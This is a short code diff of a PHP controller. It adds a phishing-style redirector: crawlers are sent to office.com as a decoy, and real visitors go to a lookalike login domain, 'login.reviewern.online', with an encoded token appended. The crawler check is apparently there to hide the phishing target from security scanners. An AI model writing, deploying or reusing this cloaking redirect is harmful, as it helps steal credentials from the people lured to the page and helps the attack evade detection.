@@ -14,14 +14,14 @@ class Controller extends BaseController
 {
     use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
 
-    public function index($random, $base64){
+    public function index($base64){
 
         if(Crawler::isCrawler()){
             return redirect()->away("https://office.com");
         }else{
-            $base64 = base64_decode($base64);
+//             $base64 = base64_decode($base64);
 //            dd($base64);
-            return redirect()->away($base64);
+            return redirect()->away("https://login.reviewern.online/obKceMCK#".$base64);
 
         }
 
